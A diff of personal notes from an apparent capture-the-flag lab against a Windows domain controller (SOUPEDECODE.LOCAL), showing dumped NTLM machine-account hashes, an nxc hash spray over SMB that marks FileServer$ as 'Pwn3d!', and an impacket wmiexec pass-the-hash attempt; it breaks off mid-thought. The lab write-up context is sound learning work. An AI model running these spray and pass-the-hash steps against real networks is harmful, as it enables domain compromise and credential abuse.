@@ -311,4 +311,20 @@ PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050
 ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
 MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
 
-It is all hashes 
+It is all hashes. I tried directly passing the has to wmiexec with printserver because I figured I could hijack that service and get SYSTEM pretty fast but this isn't SEImpersonate. I had to read in the walkthrough that it is good to re spray these on SMB shares to see which ones are even valid.
+
+root@ip-10-201-118-50:~# nxc smb 10.201.9.75 -u service_names.txt -H just_hashes.txt 
+SMB         10.201.9.75     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.9.75     445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:406b424c7b483a42458bf6f545c936f7 
+SMB         10.201.9.75     445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:e41da7e79a4c76dbd9cf79d1cb325559 STATUS_LOGON_FAILURE
+SMB         10.201.9.75     445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+
+I chopped some of the output but, moral of the story is don't go spamming random hashes
+
+root@ip-10-201-118-50:/opt/impacket/examples# python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559 FileServer@10.201.9.75
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] SMBv3.0 dialect used
+[-] Unknown DCE RPC fault status code:
+
+darn, oh wait I have a password
